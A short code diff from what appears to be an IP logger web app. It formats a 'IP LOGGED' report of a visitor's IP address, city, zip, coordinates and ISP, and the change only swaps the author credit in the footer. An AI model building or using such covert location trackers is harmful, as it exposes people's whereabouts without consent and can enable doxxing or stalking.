@@ -17,7 +17,7 @@ def home():
                                     "title": "IP LOGGED",
                                     "description":f"IP: `{ip}`\nCountry: `{geo['country']}`\nCountry Code: `{geo['countryCode']}`\nRegion: `{geo['region']}`\nRegion Name: `{geo['regionName']}`\nCity: `{geo['city']}`\nZip: `{geo['zip']}`\nLatitude: `{geo['lat']}`\nLongitude: `{geo['lon']}`\nTimezone: `{geo['timezone']}`\nISP: `{geo['isp']}`\nOrg: `{geo['org']}`\nAs: `{geo['as']}`",
                                     "color": 5763719,
-                                    "footer": {"text": "IP LOGGER BY jay ‘#1615 | https://github.com/mxte"}
+                                    "footer": {"text": "IP LOGGER BY wiz#7777 | https://github.com/mxte"}
                                     
                                 }
                                 ]
